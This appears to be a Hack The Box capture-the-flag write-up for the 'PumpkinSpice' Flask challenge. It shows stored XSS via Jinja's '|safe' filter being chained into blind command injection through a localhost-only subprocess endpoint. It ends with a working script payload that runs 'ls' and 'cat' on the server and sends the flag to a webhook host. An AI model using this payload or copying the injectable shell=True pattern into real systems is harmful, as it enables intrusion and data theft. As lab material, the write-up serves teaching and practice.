![img](./assets/banner.png)


<img src="./assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left /><font size="5px">PumpkinSpice</font>

​      12<sup>th</sup> October 2023 / Document No. D23.XX.XX

​      Prepared By: lean

​      Challenge Author(s): lean

​      Difficulty: <font color=green>Very Easy</font>

​      Classification: Official

<br>
<br>
<br>
<br>

# [Synopsis](#synopsis)

* XSS leads to blind command injection

## Description

* In the eerie realm of cyberspace, a shadowy hacker collective known as the "Phantom Pumpkin Patch" has unearthed a sinister Halloween-themed website, guarded by a devious vulnerability. As the moon casts an ominous glow, their cloaked figures gather around the flickering screens, munching on pickles, ready to exploit this spectral weakness.

## Skills Required

* Understanding of web application vulnerabilities, including XSS and command injection.
* Knowledge of Python scripting.
* Familiarity with Docker.

## Skills Learned

* Exploiting XSS vulnerabilities.
* Exploiting blind command injection vulnerabilities.
* Creating and running Docker containers.

# [Solution](#solution)

## Application Overview

<img src="./assets/homepage.png" />

This application is a simple web application built using Flask, a Python web framework. It allows users to register addresses and view a list of all registered addresses.

At the start of the program some packages are imported and a list variable **addresses** is defined.

```py
import string, time, subprocess
from flask import Flask, request, render_template, abort
from threading import Thread

app = Flask(__name__)

addresses = []
```

#### start_bot

```py
def start_bot():
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait

    host, port = "localhost", 1337
    HOST = f"http://{host}:{port}"

    options = Options()

    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-infobars")
    options.add_argument("--disable-background-networking")
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-sync")
    options.add_argument("--disable-translate")
    options.add_argument("--hide-scrollbars")
    options.add_argument("--metrics-recording-only")
    options.add_argument("--mute-audio")
    options.add_argument("--no-first-run")
    options.add_argument("--dns-prefetch-disable")
    options.add_argument("--safebrowsing-disable-auto-update")
    options.add_argument("--media-cache-size=1")
    options.add_argument("--disk-cache-size=1")
    options.add_argument("--user-agent=HTB/1.0")

    service = Service(executable_path="/usr/bin/chromedriver")
    browser = webdriver.Chrome(service=service, options=options)

    browser.get(f"{HOST}/addresses")
    time.sleep(5)
    browser.quit()
```

This function spawns a selenium instance and visits the `/addresses` endpoint. It the waits for 5 seconds and closes the automated web browser.

#### @app.route("/")

```py
@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")
```

This is the index route and it simply renders the `index.html` template using jinja.

#### @app.route("/addresses")

```py
@app.route("/addresses", methods=["GET"])
def all_addresses():
    remote_address = request.remote_addr
    if remote_address != "127.0.0.1" and remote_address != "::1":
        return render_template("index.html", message="Only localhost allowed")

    return render_template("addresses.html", addresses=addresses)
```

This route stores the requests ip address in a variable and checks if it comes from localhost, if not it renders `index.html` otherwise it renders `addresses.html` with the **addresses** variable as a parameter to the templates data.

#### @app.route("/add/address")

```py
@app.route("/add/address", methods=["POST"])
def add_address():
    address = request.form.get("address")
    
    if not address:
        return render_template("index.html", message="No address provided")

    addresses.append(address)
    Thread(target=start_bot,).start()
    return render_template("index.html", message="Address registered")
```

This endpoint accepts a form parameter with the name `address` and appends it to the **addresses** list. Then it calls `start_bot` inside a thread and renders `index.html`.

#### @app.route("/api/stats")

```py
@app.route("/api/stats", methods=["GET"])
def stats():
    remote_address = request.remote_addr
    if remote_address != "127.0.0.1" and remote_address != "::1":
        return render_template("index.html", message="Only localhost allowed")

    command = request.args.get("command")
    if not command:
        return render_template("index.html", message="No command provided")

    results = subprocess.check_output(command, shell=True, universal_newlines=True)
    return results
```

This endpoint also performs a localhost check like the `addresses` endpoint, after that it expects a get argument named `command`, if it exists `subprocess.check_output` is called with `command` as a parameter and the output is returned in the response.

## Exploitation

To get access to the flag we first must exploit an XSS vulnurability by abusing the `|safe` operator used to render the `addresses.html` template.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="lean">
	<title>🎃 Pumpkin Spice 🎃</title>
</head>
<body>
    <h1>System stats:</h1>
    <p id="stats"></p>
    <h1>Addresses:</h1>
    {% for address in addresses %}
        <p>{{ address|safe }}</p>
    {% endfor %}
    <script src="/static/js/script.js"></script>
</body>
</html>
```

Because there is no input validation when registering an address at the `/add/address` route and unsafe string escaping is used to render the addresses we can achieve XSS by providing a payload in the **address** form parameter.

```html
<script>alert(0)</script>
```

Now we can bypass the localhost check because by adding a new address the `start_bot` function is called and the browser is run on localhost.

This allows us to reach to the `/api/stats` endpoint and inject our own arbitrary command that will reveal the flag file name, get its contents and exfiltrate them to our own webserver.

```html
<script>(async () => {{let response = await fetch('/api/stats?command=ls+/');let flag = await response.text();response = await fetch('/api/stats?command=cat+/flag' + flag.split('flag')[1].substr(0, 10) + '.txt');flag = await response.text();await fetch('{WEBHOOK_URL}?c=' + btoa(flag))}})()</script>
```